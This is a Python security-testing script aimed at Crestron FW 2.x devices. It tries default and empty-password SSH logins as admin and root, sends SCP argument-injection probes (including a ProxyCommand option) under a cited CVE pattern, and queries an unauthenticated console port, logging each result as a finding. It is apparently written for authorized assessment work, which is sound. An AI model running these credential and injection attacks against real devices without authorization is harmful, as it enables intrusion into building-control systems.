#!/usr/bin/env python3
"""
CrestronFW2x SSH/SCP Security Test Script
=================================
Tests SSH and SCP vulnerabilities on authorized Crestron FW 2.x fleet.

Tests performed (on first 3 reachable hosts):
  1. SSH Banner Grab — port 22, verify SSH-2.0-CRESTRON_SSHD
  2. SSH Auth Test — admin:admin via paramiko
  3. SSH Empty Password Test — admin with empty password
  4. SSH Root Login Test — root:admin and root with empty password
  5. SCP Argument Injection — CVE-2025-47421 pattern testing
  6. CTP Console Connection — TCP 41795, VER command

All hosts are authorized employer equipment with default credentials.
"""

import json
import os
import socket
import sys
import time

# Add script directory to path for common library
sys.path.insert(0, os.path.dirname(__file__))
from crestron_fw2x_common import EvidenceCollector, load_hosts

import paramiko

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
EVIDENCE_OUT = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Crestron_FW2x/evidence/cf4_ssh_scp_evidence.json"
TIMEOUT = 5           # seconds per connection
RATE_LIMIT = 1.0      # seconds between tests
MAX_TEST_HOSTS = 3    # only test first 3 reachable hosts
SSH_PORT = 22
CTP_PORT = 41795

# Default credentials
USER = "admin"
PASS = "admin"


def rate_limit():
    """Sleep for rate limiting between tests."""
    time.sleep(RATE_LIMIT)


def check_host_reachable(host, port=SSH_PORT, timeout=TIMEOUT):
    """Quick TCP connect check to see if host is reachable on SSH port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.close()
        return True
    except (socket.timeout, socket.error, OSError):
        try:
            sock.close()
        except Exception:
            pass
        return False


# ---------------------------------------------------------------------------
# Test 1: SSH Banner Grab
# ---------------------------------------------------------------------------
def test_ssh_banner(host, collector):
    """Connect to port 22 and grab the SSH banner."""
    test_id = f"SSH_BANNER_{host}"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, SSH_PORT))
        banner = sock.recv(256).decode('utf-8', errors='replace').strip()
        sock.close()

        is_crestron = "CRESTRON" in banner.upper()
        result = "CRESTRON_SSHD_CONFIRMED" if is_crestron else f"UNEXPECTED: {banner}"

        collector.add_test(
            test_id,
            f"SSH banner grab on {host}:22",
            {"host": host, "port": SSH_PORT, "action": "TCP connect + recv banner"},
            {"banner": banner, "is_crestron_sshd": is_crestron},
            result
        )

        if is_crestron:
            collector.add_finding(
                f"[REDACTED-ID]_SSH-BANNER-{host}",
                "INFO",
                f"Crestron custom SSH daemon identified on {host}",
                {
                    "banner": banner,
                    "note": "Custom Dropbear SSH with sshShell.sh handler",
                    "implication": "Non-standard SSH implementation may have custom vulnerabilities"
                }
            )
        return banner
    except Exception as e:
        collector.add_test(
            test_id,
            f"SSH banner grab on {host}:22",
            {"host": host, "port": SSH_PORT},
            {"error": str(e)},
            "ERROR"
        )
        return None


# ---------------------------------------------------------------------------
# Test 2: SSH Auth Test (admin:admin)
# ---------------------------------------------------------------------------
def test_ssh_auth(host, collector):
    """Test SSH authentication with admin:admin default credentials."""
    test_id = f"SSH_AUTH_{host}"
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host, port=SSH_PORT, username=USER, password=PASS,
            timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT,
            allow_agent=False, look_for_keys=False
        )

        # Try to get transport info
        transport = client.get_transport()
        remote_version = transport.remote_version if transport else "unknown"
        auth_result = "AUTH_SUCCESS"

        # Try executing a harmless command
        cmd_output = ""
        try:
            stdin, stdout, stderr = client.exec_command("ver", timeout=TIMEOUT)
            cmd_output = stdout.read().decode('utf-8', errors='replace').strip()
            cmd_err = stderr.read().decode('utf-8', errors='replace').strip()
            if cmd_err and not cmd_output:
                cmd_output = f"stderr: {cmd_err}"
        except Exception as cmd_e:
            cmd_output = f"exec_command error: {cmd_e}"

        client.close()

        collector.add_test(
            test_id,
            f"SSH auth test admin:admin on {host}",
            {"host": host, "username": USER, "password": "admin", "port": SSH_PORT},
            {
                "auth_result": auth_result,
                "remote_version": remote_version,
                "command_output": cmd_output[:500]
            },
            auth_result
        )

        collector.add_finding(
            f"[REDACTED-ID]_SSH-DEFCRED-{host}",
            "HIGH",
            f"Default credentials admin:admin accepted on {host}",
            {
                "username": USER,
                "password": PASS,
                "ssh_version": remote_version,
                "command_output": cmd_output[:500],
                "impact": "Full administrative SSH access with default credentials"
            }
        )
        return True

    except paramiko.AuthenticationException:
        collector.add_test(
            test_id,
            f"SSH auth test admin:admin on {host}",
            {"host": host, "username": USER, "password": "admin"},
            {"auth_result": "AUTH_FAILED"},
            "AUTH_FAILED"
        )
        return False
    except Exception as e:
        collector.add_test(
            test_id,
            f"SSH auth test admin:admin on {host}",
            {"host": host, "username": USER},
            {"error": str(e), "error_type": type(e).__name__},
            "ERROR"
        )
        return False


# ---------------------------------------------------------------------------
# Test 3: SSH Empty Password Test
# ---------------------------------------------------------------------------
def test_ssh_empty_password(host, collector):
    """Test SSH with admin and empty password (PermitEmptyPasswords yes)."""
    test_id = f"SSH_EMPTY_PASS_{host}"
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host, port=SSH_PORT, username=USER, password="",
            timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT,
            allow_agent=False, look_for_keys=False
        )

        transport = client.get_transport()
        remote_version = transport.remote_version if transport else "unknown"
        client.close()

        collector.add_test(
            test_id,
            f"SSH empty password test (admin:'') on {host}",
            {"host": host, "username": USER, "password": "(empty)"},
            {"auth_result": "AUTH_SUCCESS", "remote_version": remote_version},
            "EMPTY_PASSWORD_ACCEPTED"
        )

        collector.add_finding(
            f"[REDACTED-ID]_SSH-EMPTYPASS-{host}",
            "CRITICAL",
            f"Empty password accepted for admin on {host}",
            {
                "username": USER,
                "password": "(empty string)",
                "ssh_version": remote_version,
                "sshd_config": "PermitEmptyPasswords yes",
                "impact": "Administrative SSH access with NO password required"
            }
        )
        return True

    except paramiko.AuthenticationException:
        collector.add_test(
            test_id,
            f"SSH empty password test (admin:'') on {host}",
            {"host": host, "username": USER, "password": "(empty)"},
            {"auth_result": "AUTH_FAILED"},
            "AUTH_FAILED"
        )
        return False
    except Exception as e:
        collector.add_test(
            test_id,
            f"SSH empty password test (admin:'') on {host}",
            {"host": host, "username": USER},
            {"error": str(e), "error_type": type(e).__name__},
            "ERROR"
        )
        return False


# ---------------------------------------------------------------------------
# Test 4: SSH Root Login Test
# ---------------------------------------------------------------------------
def test_ssh_root_login(host, collector):
    """Test SSH root login with admin password and empty password."""
    results = {}

    # 4a: root:admin
    test_id = f"SSH_ROOT_ADMIN_{host}"
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host, port=SSH_PORT, username="root", password=PASS,
            timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT,
            allow_agent=False, look_for_keys=False
        )

        transport = client.get_transport()
        remote_version = transport.remote_version if transport else "unknown"
        client.close()

        collector.add_test(
            test_id,
            f"SSH root:admin login test on {host}",
            {"host": host, "username": "root", "password": "admin"},
            {"auth_result": "AUTH_SUCCESS", "remote_version": remote_version},
            "ROOT_LOGIN_SUCCESS"
        )

        collector.add_finding(
            f"[REDACTED-ID]_SSH-ROOT-{host}",
            "CRITICAL",
            f"Root SSH login with default password on {host}",
            {
                "username": "root",
                "password": PASS,
                "ssh_version": remote_version,
                "impact": "Direct root shell access with default credentials"
            }
        )
        results["root_admin"] = True

    except paramiko.AuthenticationException:
        collector.add_test(
            test_id,
            f"SSH root:admin login test on {host}",
            {"host": host, "username": "root", "password": "admin"},
            {"auth_result": "AUTH_FAILED"},
            "AUTH_FAILED"
        )
        results["root_admin"] = False
    except Exception as e:
        collector.add_test(
            test_id,
            f"SSH root:admin login test on {host}",
            {"host": host, "username": "root"},
            {"error": str(e), "error_type": type(e).__name__},
            "ERROR"
        )
        results["root_admin"] = None

    rate_limit()

    # 4b: root with empty password
    test_id = f"SSH_ROOT_EMPTY_{host}"
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host, port=SSH_PORT, username="root", password="",
            timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT,
            allow_agent=False, look_for_keys=False
        )

        transport = client.get_transport()
        remote_version = transport.remote_version if transport else "unknown"
        client.close()

        collector.add_test(
            test_id,
            f"SSH root empty password test on {host}",
            {"host": host, "username": "root", "password": "(empty)"},
            {"auth_result": "AUTH_SUCCESS", "remote_version": remote_version},
            "ROOT_EMPTY_PASSWORD_ACCEPTED"
        )

        collector.add_finding(
            f"[REDACTED-ID]_SSH-ROOT-EMPTYPASS-{host}",
            "CRITICAL",
            f"Root SSH login with empty password on {host}",
            {
                "username": "root",
                "password": "(empty string)",
                "ssh_version": remote_version,
                "impact": "Root shell access with NO password"
            }
        )
        results["root_empty"] = True

    except paramiko.AuthenticationException:
        collector.add_test(
            test_id,
            f"SSH root empty password test on {host}",
            {"host": host, "username": "root", "password": "(empty)"},
            {"auth_result": "AUTH_FAILED"},
            "AUTH_FAILED"
        )
        results["root_empty"] = False
    except Exception as e:
        collector.add_test(
            test_id,
            f"SSH root empty password test on {host}",
            {"host": host, "username": "root"},
            {"error": str(e), "error_type": type(e).__name__},
            "ERROR"
        )
        results["root_empty"] = None

    return results


# ---------------------------------------------------------------------------
# Test 5: SCP Argument Injection (CVE-2025-47421 pattern)
# ---------------------------------------------------------------------------
def test_scp_argument_injection(host, collector):
    """
    Test SCP argument injection on FW 2.x.

    The sshShell.sh processes SCP commands like:
      new_cmd=$(echo "$@" | busybox awk '{print $2 " " $3 ... " " $10}')
      scp -U $SCP_PARAM $new_cmd

    The $new_cmd is UNQUOTED — filenames with spaces or SCP option flags
    could be injected as separate arguments.

    Test payloads (safe, non-destructive probes):
      - Filename with -v flag to check verbose output leakage
      - Filename with spaces to test argument splitting
      - Filename with --help to probe option parsing
    """
    test_id_base = f"SCP_ARGINJECT_{host}"
    results = {}

    # Payloads: tuple of (label, remote_path)
    # These test whether the SCP handler processes injected arguments
    payloads = [
        ("flag_verbose", "-v /tmp/test"),
        ("flag_help", "--help"),
        ("space_split", "file name with spaces"),
        ("option_inject", "-o ProxyCommand=echo_test /tmp/x"),
        ("double_dash", "-- -v /tmp/test"),
    ]

    for label, payload in payloads:
        test_id = f"{test_id_base}_{label}"
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                host, port=SSH_PORT, username=USER, password=PASS,
                timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT,
                allow_agent=False, look_for_keys=False
            )

            transport = client.get_transport()
            if not transport:
                collector.add_test(
                    test_id,
                    f"SCP arg injection ({label}) on {host}",
                    {"host": host, "payload": payload},
                    {"error": "No transport available"},
                    "ERROR"
                )
                results[label] = None
                client.close()
                rate_limit()
                continue

            # Open a session channel and send an SCP-like command
            # The sshShell.sh case-matches on the first word of the SSH command
            # We send "scp <payload>" as the exec command, which sshShell.sh
            # will parse via awk and pass to the custom scp binary
            channel = transport.open_session()
            channel.settimeout(TIMEOUT)

            # The SCP protocol: "scp -t <path>" for upload (to), "scp -f <path>" for download (from)
            # We test both -t (write) direction and injected arguments
            scp_cmd = f"scp -t {payload}"
            channel.exec_command(scp_cmd)

            # Read any response (SCP protocol or error messages)
            time.sleep(1)
            response_data = b""
            try:
                while channel.recv_ready():
                    chunk = channel.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
            except Exception:
                pass

            # Also check stderr
            stderr_data = b""
            try:
                while channel.recv_stderr_ready():
                    chunk = channel.recv_stderr(4096)
                    if not chunk:
                        break
                    stderr_data += chunk
            except Exception:
                pass

            exit_status = channel.recv_exit_status() if channel.exit_status_ready() else -1

            channel.close()
            client.close()

            response_text = response_data.decode('utf-8', errors='replace')
            stderr_text = stderr_data.decode('utf-8', errors='replace')

            # Analyze response for signs of argument injection success
            injected = False
            injection_evidence = []

            if label == "flag_verbose" and ("debug" in response_text.lower() or
                                            "debug" in stderr_text.lower() or
                                            "verbose" in stderr_text.lower()):
                injected = True
                injection_evidence.append("Verbose/debug output leaked from -v flag injection")

            if label == "flag_help" and ("usage" in response_text.lower() or
                                         "usage" in stderr_text.lower()):
                injected = True
                injection_evidence.append("Help/usage text returned — SCP binary parsed injected --help")

            if label == "option_inject" and ("proxy" in response_text.lower() or
                                              "proxy" in stderr_text.lower() or
                                              "proxycommand" in stderr_text.lower()):
                injected = True
                injection_evidence.append("ProxyCommand option was processed by SCP binary")

            # Permission denied = sshShell.sh processed the command but access control worked
            if "permission denied" in response_text.lower() or "permission denied" in stderr_text.lower():
                injection_evidence.append("Permission denied returned (access control active)")

            result_str = "INJECTION_CONFIRMED" if injected else "NO_INJECTION_DETECTED"

            collector.add_test(
                test_id,
                f"SCP argument injection ({label}) on {host}",
                {"host": host, "scp_command": scp_cmd, "payload": payload, "label": label},
                {
                    "stdout": response_text[:500],
                    "stderr": stderr_text[:500],
                    "exit_status": exit_status,
                    "injection_detected": injected,
                    "injection_evidence": injection_evidence,
                    "raw_stdout_hex": response_data[:64].hex() if response_data else "",
                },
                result_str
            )

            if injected:
                collector.add_finding(
                    f"[REDACTED-ID]_SCP-ARGINJECT-{host}-{label}",
                    "HIGH",
                    f"SCP argument injection ({label}) on {host}",
                    {
                        "cve_pattern": "CVE-2025-47421",
                        "payload": payload,
                        "scp_command": scp_cmd,
                        "evidence": injection_evidence,
                        "sshShell_line": 'new_cmd=`echo "$@" | busybox awk \'...\'`',
                        "root_cause": "Unquoted $new_cmd variable in sshShell.sh line 95",
                        "impact": "SCP argument injection may allow chroot escape or privilege escalation"
                    }
                )

            results[label] = {
                "injected": injected,
                "stdout": response_text[:200],
                "stderr": stderr_text[:200],
                "exit_status": exit_status
            }

        except paramiko.AuthenticationException:
            collector.add_test(
                test_id,
                f"SCP argument injection ({label}) on {host}",
                {"host": host, "scp_command": f"scp -t {payload}"},
                {"error": "Authentication failed — cannot test SCP"},
                "SKIPPED_AUTH_FAILED"
            )
            results[label] = None
            # If auth fails, skip remaining payloads for this host
            break
        except Exception as e:
            collector.add_test(
                test_id,
                f"SCP argument injection ({label}) on {host}",
                {"host": host, "scp_command": f"scp -t {payload}"},
                {"error": str(e), "error_type": type(e).__name__},
                "ERROR"
            )
            results[label] = None

        rate_limit()

    return results


# ---------------------------------------------------------------------------
# Test 6: CTP Console Connection
# ---------------------------------------------------------------------------
def test_ctp_console(host, collector):
    """Connect to CTP console (port 41795) and send VER command."""
    test_id = f"CTP_CONSOLE_{host}"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, CTP_PORT))

        # Read initial banner/prompt
        time.sleep(0.5)
        banner = b""
        try:
            while True:
                sock.settimeout(1)
                chunk = sock.recv(4096)
                if not chunk:
                    break
                banner += chunk
        except socket.timeout:
            pass

        banner_text = banner.decode('utf-8', errors='replace')

        # Send VER command
        sock.settimeout(TIMEOUT)
        sock.send(b"VER\r\n")
        time.sleep(1)

        response = b""
        try:
            while True:
                sock.settimeout(2)
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        ver_text = response.decode('utf-8', errors='replace')
        sock.close()

        collector.add_test(
            test_id,
            f"CTP console connection (port {CTP_PORT}) on {host}",
            {"host": host, "port": CTP_PORT, "command": "VER"},
            {
                "banner": banner_text[:500],
                "ver_response": ver_text[:1000],
                "banner_hex": banner[:32].hex() if banner else "",
            },
            "CTP_CONNECTED" if (banner or ver_text) else "CTP_NO_RESPONSE"
        )

        if banner_text or ver_text:
            collector.add_finding(
                f"[REDACTED-ID]_CTP-UNAUTH-{host}",
                "HIGH",
                f"Unauthenticated CTP console access on {host}:{CTP_PORT}",
                {
                    "banner": banner_text[:300],
                    "ver_response": ver_text[:500],
                    "note": "CTP console accepts connections without authentication",
                    "impact": "Device enumeration, configuration changes, potential command injection"
                }
            )

        return {"banner": banner_text, "ver_response": ver_text}

    except socket.timeout:
        collector.add_test(
            test_id,
            f"CTP console connection (port {CTP_PORT}) on {host}",
            {"host": host, "port": CTP_PORT},
            {"error": "Connection timed out"},
            "CTP_TIMEOUT"
        )
        return None
    except ConnectionRefusedError:
        collector.add_test(
            test_id,
            f"CTP console connection (port {CTP_PORT}) on {host}",
            {"host": host, "port": CTP_PORT},
            {"error": "Connection refused"},
            "CTP_REFUSED"
        )
        return None
    except Exception as e:
        collector.add_test(
            test_id,
            f"CTP console connection (port {CTP_PORT}) on {host}",
            {"host": host, "port": CTP_PORT},
            {"error": str(e), "error_type": type(e).__name__},
            "ERROR"
        )
        return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    print("=" * 80)
    print("CrestronFW2x SSH/SCP Security Test — Crestron FW 2.x Fleet")
    print("=" * 80)
    print()

    # Initialize evidence collector
    collector = EvidenceCollector(
        "cf4_ssh_scp_test",
        "SSH and SCP vulnerability testing on authorized Crestron FW 2.x fleet"
    )

    # Load all hosts from IP list
    all_hosts = load_hosts()
    print(f"[*] Loaded {len(all_hosts)} hosts from IP list")

    # Find first 3 reachable hosts (SSH port 22)
    print(f"[*] Scanning for first {MAX_TEST_HOSTS} reachable hosts on port {SSH_PORT}...")
    reachable_hosts = []
    for ip in all_hosts:
        if len(reachable_hosts) >= MAX_TEST_HOSTS:
            break
        print(f"  Checking {ip}:22 ... ", end="", flush=True)
        if check_host_reachable(ip):
            print("REACHABLE")
            reachable_hosts.append(ip)
        else:
            print("unreachable")

    if not reachable_hosts:
        print("\n[!] No reachable hosts found. Exiting.")
        collector.add_anomaly(
            "NO_REACHABLE_HOSTS",
            "No hosts were reachable on SSH port 22",
            {"hosts_checked": len(all_hosts)}
        )
        collector.save(EVIDENCE_OUT)
        return

    print(f"\n[*] Testing {len(reachable_hosts)} hosts: {', '.join(reachable_hosts)}")
    print()

    # Run tests on each reachable host
    for host in reachable_hosts:
        print(f"\n{'=' * 60}")
        print(f"HOST: {host}")
        print(f"{'=' * 60}")

        # Test 1: SSH Banner Grab
        print(f"\n[1/6] SSH Banner Grab")
        banner = test_ssh_banner(host, collector)
        rate_limit()

        # Test 2: SSH Auth Test (admin:admin)
        print(f"\n[2/6] SSH Auth Test (admin:admin)")
        auth_ok = test_ssh_auth(host, collector)
        rate_limit()

        # Test 3: SSH Empty Password Test
        print(f"\n[3/6] SSH Empty Password Test")
        test_ssh_empty_password(host, collector)
        rate_limit()

        # Test 4: SSH Root Login Test
        print(f"\n[4/6] SSH Root Login Test")
        test_ssh_root_login(host, collector)
        rate_limit()

        # Test 5: SCP Argument Injection
        print(f"\n[5/6] SCP Argument Injection Test (CVE-2025-47421 pattern)")
        if auth_ok:
            test_scp_argument_injection(host, collector)
        else:
            collector.add_test(
                f"SCP_ARGINJECT_{host}_SKIPPED",
                f"SCP argument injection skipped on {host} — SSH auth failed",
                {"host": host},
                {"reason": "Cannot test SCP without SSH authentication"},
                "SKIPPED"
            )
            print("  [SKIP] SSH auth failed — cannot test SCP")
        rate_limit()

        # Test 6: CTP Console
        print(f"\n[6/6] CTP Console Connection (port {CTP_PORT})")
        test_ctp_console(host, collector)
        rate_limit()

    # Save evidence
    print()
    collector.save(EVIDENCE_OUT)

    # Print summary
    print()
    print("=" * 80)
    print("TEST SUMMARY")
    print("=" * 80)
    print(f"  Hosts tested:    {len(reachable_hosts)}")
    print(f"  Total tests:     {len(collector.tests)}")
    print(f"  Findings:        {len(collector.findings)}")
    print(f"  Anomalies:       {len(collector.anomalies)}")

    if collector.findings:
        print()
        print("  FINDINGS:")
        for f in collector.findings:
            print(f"    [{f['severity']:8s}] {f['title']}")

    print()
    print(f"  Evidence saved to: {EVIDENCE_OUT}")
    print("=" * 80)


if __name__ == "__main__":
    main()
